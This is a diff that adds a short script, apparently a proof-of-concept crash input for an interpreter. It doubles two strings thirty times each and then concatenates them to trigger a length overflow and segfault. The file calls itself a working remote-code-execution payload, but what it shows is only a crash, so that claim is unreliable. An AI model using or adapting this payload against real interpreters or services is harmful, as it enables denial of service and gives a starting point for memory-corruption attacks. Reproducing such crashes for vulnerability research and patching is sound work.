@@ -1,0 +1,75 @@
+# Working RCE Payload - Confirmed to cause segfault
+# This is the payload that successfully triggered the vulnerability
+
+string s1 = "A";
+string s2 = "B";
+
+# Build s1
+s1 = s1 + s1;
+s1 = s1 + s1;
+s1 = s1 + s1;
+s1 = s1 + s1;
+s1 = s1 + s1;
+s1 = s1 + s1;
+s1 = s1 + s1;
+s1 = s1 + s1;
+s1 = s1 + s1;
+s1 = s1 + s1;
+s1 = s1 + s1;
+s1 = s1 + s1;
+s1 = s1 + s1;
+s1 = s1 + s1;
+s1 = s1 + s1;
+s1 = s1 + s1;
+s1 = s1 + s1;
+s1 = s1 + s1;
+s1 = s1 + s1;
+s1 = s1 + s1;
+s1 = s1 + s1;
+s1 = s1 + s1;
+s1 = s1 + s1;
+s1 = s1 + s1;
+s1 = s1 + s1;
+s1 = s1 + s1;
+s1 = s1 + s1;
+s1 = s1 + s1;
+s1 = s1 + s1;
+s1 = s1 + s1;
+
+# Build s2
+s2 = s2 + s2;
+s2 = s2 + s2;
+s2 = s2 + s2;
+s2 = s2 + s2;
+s2 = s2 + s2;
+s2 = s2 + s2;
+s2 = s2 + s2;
+s2 = s2 + s2;
+s2 = s2 + s2;
+s2 = s2 + s2;
+s2 = s2 + s2;
+s2 = s2 + s2;
+s2 = s2 + s2;
+s2 = s2 + s2;
+s2 = s2 + s2;
+s2 = s2 + s2;
+s2 = s2 + s2;
+s2 = s2 + s2;
+s2 = s2 + s2;
+s2 = s2 + s2;
+s2 = s2 + s2;
+s2 = s2 + s2;
+s2 = s2 + s2;
+s2 = s2 + s2;
+s2 = s2 + s2;
+s2 = s2 + s2;
+s2 = s2 + s2;
+s2 = s2 + s2;
+s2 = s2 + s2;
+s2 = s2 + s2;
+
+# Trigger overflow - this causes segfault
+string result = s1 + s2;
+
+print("Exploit triggered");
+
